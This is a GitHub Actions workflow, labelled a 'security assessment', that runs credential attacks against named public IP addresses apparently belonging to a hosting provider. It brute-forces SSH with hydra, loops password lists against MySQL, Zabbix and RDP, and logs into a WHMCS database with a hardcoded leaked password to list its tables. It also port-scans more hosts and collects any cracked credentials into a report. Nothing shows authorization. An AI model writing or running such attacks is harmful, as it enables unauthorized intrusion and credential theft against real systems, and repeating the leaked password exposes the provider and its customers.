name: "Security Assessment - Credential Testing"
"on":
  workflow_dispatch:
    inputs:
      ssh_target:
        description: SSH Target IP
        required: true
        default: '5.161.125.229'
      mysql_target:
        description: MySQL Target IP
        required: true
        default: '162.55.177.241'
      whmcs_db_host:
        description: WHMCS DB Host
        required: true
        default: '207.148.18.120'
      zabbix_target:
        description: Zabbix Target IP
        required: true
        default: '5.78.127.58'
      rdp_target:
        description: RDP Target IP
        required: true
        default: '45.87.61.101'

jobs:
  recon:
    name: Phase 1 - Target Verification
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Verify Targets
        run: |
          echo "=== NETWORK REACHABILITY ==="
          for t in "${{ inputs.ssh_target }}" "${{ inputs.mysql_target }}" "${{ inputs.zabbix_target }}" "${{ inputs.rdp_target }}" "${{ inputs.whmcs_db_host }}"; do
            for p in 22 80 443 3306 3389; do
              timeout 2 bash -c "echo >/dev/tcp/\$t/$p" 2>/dev/null && echo "  $t:$p OPEN"
            done 2>/dev/null
          done
          echo "CPU: $(nproc) cores | RAM: $(free -h | awk '/Mem:/ {print $2}') | IP: $(curl -s ifconfig.me 2>/dev/null)"

  ssh-brute:
    name: Phase 2a - SSH Testing
    needs: recon
    runs-on: ubuntu-latest
    strategy:
      matrix:
        user: [root, admin, hyonix, www-data]
    steps:
      - uses: actions/checkout@v4
      - name: SSH Brute Force - ${{ matrix.user }}
        run: |
          sudo apt-get update -qq && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq sshpass hydra 2>&1 | tail -1
          echo "=== SSH TARGET: ${{ inputs.ssh_target }} USER: ${{ matrix.user }} ==="
          hydra -l ${{ matrix.user }} -P passwords.txt -t 6 -V -f -o /tmp/ssh_result.txt ssh://${{ inputs.ssh_target }} 2>&1 || true
          if [ -s /tmp/ssh_result.txt ]; then
            echo "=== CREDENTIALS FOUND ==="
            cat /tmp/ssh_result.txt
          else
            echo "NO CREDENTIALS for ${{ matrix.user }}"
          fi
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: ssh-${{ matrix.user }}
          path: /tmp/ssh_result.txt
          if-no-files-found: ignore

  mysql-test:
    name: Phase 2b - MySQL Testing
    needs: recon
    runs-on: ubuntu-latest
    strategy:
      matrix:
        user: [root, hyonix_api, hyonix, admin]
    steps:
      - uses: actions/checkout@v4
      - name: MySQL Brute - ${{ matrix.user }}
        run: |
          sudo apt-get update -qq && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq mysql-client 2>&1 | tail -1
          echo "=== MYSQL TARGET: ${{ inputs.mysql_target }} USER: ${{ matrix.user }} ==="
          while IFS= read -r pass; do
            result=$(timeout 4 mysql -h ${{ inputs.mysql_target }} -u ${{ matrix.user }} -p"$pass" -e "SELECT 1;" 2>&1)
            if echo "$result" | grep -qv "ERROR 1045\|ERROR 2003\|Access denied\|ERROR 2002"; then
              echo "FOUND: ${{ matrix.user }}:$pass"
              echo "${{ matrix.user }}:$pass" >> /tmp/mysql_found.txt
              echo "$result"
            fi
          done < passwords.txt
          if [ -s /tmp/mysql_found.txt ]; then echo "CREDENTIALS:"; cat /tmp/mysql_found.txt; fi
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: mysql-${{ matrix.user }}
          path: /tmp/mysql_found.txt
          if-no-files-found: ignore

  whmcs-db:
    name: Phase 2c - WHMCS DB
    needs: recon
    runs-on: ubuntu-latest
    steps:
      - name: Test Leaked Credentials
        run: |
          sudo apt-get update -qq && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq mysql-client 2>&1 | tail -1
          echo "=== WHMCS DB: ${{ inputs.whmcs_db_host }} ==="
          # Try leaked credentials
          for db in hyonix_whmcs whmcs mysql information_schema; do
            result=$(timeout 5 mysql -h ${{ inputs.whmcs_db_host }} -u hyonix_api -p'HyonixAPI@123' "$db" -e "SELECT 1;" 2>&1)
            if echo "$result" | grep -qv "ERROR"; then
              echo "DB ACCESS: hyonix_api:HyonixAPI@123 @ $db"
              echo "$result" > /tmp/db_access.txt
              mysql -h ${{ inputs.whmcs_db_host }} -u hyonix_api -p'HyonixAPI@123' "$db" -e "SELECT DATABASE(), USER(), VERSION();" >> /tmp/db_access.txt
              mysql -h ${{ inputs.whmcs_db_host }} -u hyonix_api -p'HyonixAPI@123' "$db" -e "SELECT table_name FROM information_schema.tables WHERE table_schema='$db' LIMIT 50;" > /tmp/db_tables.txt 2>&1
            fi
          done
          if [ -f /tmp/db_access.txt ]; then echo "=== DB ACCESS ==="; cat /tmp/db_access.txt; cat /tmp/db_tables.txt; fi
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: whmcs-db
          path: /tmp/db_*.txt
          if-no-files-found: ignore

  zabbix:
    name: Phase 2d - Zabbix
    needs: recon
    runs-on: ubuntu-latest
    steps:
      - name: Zabbix Login Test
        run: |
          echo "=== ZABBIX: ${{ inputs.zabbix_target }} ==="
          V=$(curl -sk --connect-timeout 5 "https://${{ inputs.zabbix_target }}/api_jsonrpc.php" \
            -d '{"jsonrpc":"2.0","method":"apiinfo.version","params":[],"id":1}' \
            -H "Content-Type: application/json" 2>&1)
          echo "Version: $V"
          for user in Admin admin superadmin root; do
            for pass in zabbix admin password 123456 P@ssw0rd hyonix Hyonix changeme root root123 test; do
              R=$(curl -sk --connect-timeout 3 "https://${{ inputs.zabbix_target }}/api_jsonrpc.php" \
                -d "{\"jsonrpc\":\"2.0\",\"method\":\"user.login\",\"params\":{\"username\":\"$user\",\"password\":\"$pass\"},\"id\":1}" \
                -H "Content-Type: application/json" 2>&1)
              if echo "$R" | grep -qv "error"; then
                echo "ZABBIX LOGIN: $user:$pass"
                echo "$user:$pass" >> /tmp/zabbix_creds.txt
                echo "$R" >> /tmp/zabbix_creds.txt
              fi
            done
          done
          if [ -s /tmp/zabbix_creds.txt ]; then echo "CREDENTIALS FOUND:"; cat /tmp/zabbix_creds.txt; fi
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: zabbix
          path: /tmp/zabbix_*.txt
          if-no-files-found: ignore

  rdp:
    name: Phase 2e - RDP
    needs: recon
    runs-on: ubuntu-latest
    steps:
      - name: RDP Check
        run: |
          echo "=== RDP: ${{ inputs.rdp_target }} ==="
          timeout 3 bash -c "echo >/dev/tcp/${{ inputs.rdp_target }}/3389" 2>/dev/null && echo "PORT 3389 OPEN" || echo "PORT 3389 CLOSED"
          sudo apt-get update -qq && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq freerdp2-x11 2>&1 | tail -1
          for user in administrator admin; do
            for pass in "" password admin 123456 P@ssw0rd changeme hyonix root test; do
              R=$(timeout 5 xfreerdp /v:${{ inputs.rdp_target }} /u:"$user" /p:"$pass" +auth-only 2>&1)
              if echo "$R" | grep -qv "ERRCONNECT_LOGON_FAILURE\|ERRCONNECT_CONNECT_FAILED\|CredSSP\|failure"; then
                echo "RDP: $user:$pass"
                echo "$user:$pass" >> /tmp/rdp_found.txt
              fi
            done
          done
          if [ -s /tmp/rdp_found.txt ]; then echo "RDP CREDENTIALS:"; cat /tmp/rdp_found.txt; fi
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: rdp
          path: /tmp/rdp_found.txt
          if-no-files-found: ignore

  cred-reuse:
    name: Phase 3 - Credential Reuse
    needs: [ssh-brute, mysql-test, zabbix, rdp]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          path: /tmp/results
      - name: Reuse Testing
        run: |
          echo "=== CREDENTIAL REUSE ==="
          # Extract any found creds
          grep -rh "FOUND:" /tmp/results/ 2>/dev/null | sed 's/FOUND://' > /tmp/all_creds.txt
          cat /tmp/all_creds.txt 2>/dev/null
          ALL_HOSTS="5.161.125.229 5.161.54.155 162.55.177.241 89.58.3.202 78.47.153.158 5.78.127.58 45.87.61.101 49.12.41.9 167.235.220.62 5.78.153.212 5.161.71.173 207.148.18.120 185.3.93.228"
          echo "=== Testing $ALL_HOSTS ==="
          for host in $ALL_HOSTS; do
            for p in 22 80 443 3306 3389 8080 8443; do
              timeout 2 bash -c "echo >/dev/tcp/$host/$p" 2>/dev/null && echo "  $host:$p OPEN"
            done 2>/dev/null
          done

  report:
    if: always()
    needs: [ssh-brute, mysql-test, whmcs-db, zabbix, rdp, cred-reuse]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          path: /tmp/final
      - name: Final Report
        run: |
          echo "# HYONIX SECURITY ASSESSMENT REPORT" > /tmp/report.md
          echo "Date: $(date -u)" >> /tmp/report.md
          echo "" >> /tmp/report.md
          echo "## Targets Tested" >> /tmp/report.md
          echo "| Host | Purpose |" >> /tmp/report.md
          echo "|------|---------|" >> /tmp/report.md
          echo "| ${{ inputs.ssh_target }} | WordPress/SSH |" >> /tmp/report.md
          echo "| ${{ inputs.mysql_target }} | Dev MySQL |" >> /tmp/report.md
          echo "| ${{ inputs.whmcs_db_host }} | WHMCS Database |" >> /tmp/report.md
          echo "| ${{ inputs.zabbix_target }} | Zabbix Monitoring |" >> /tmp/report.md
          echo "| ${{ inputs.rdp_target }} | Windows RDP/AD |" >> /tmp/report.md
          echo "" >> /tmp/report.md
          echo "## Findings" >> /tmp/report.md
          find /tmp/final -type f -exec echo "--- {} ---" \; -exec cat {} \; 2>/dev/null >> /tmp/report.md
          cat /tmp/report.md
      - name: Upload Report
        uses: actions/upload-artifact@v4
        with:
          name: final-report
          path: /tmp/report.md
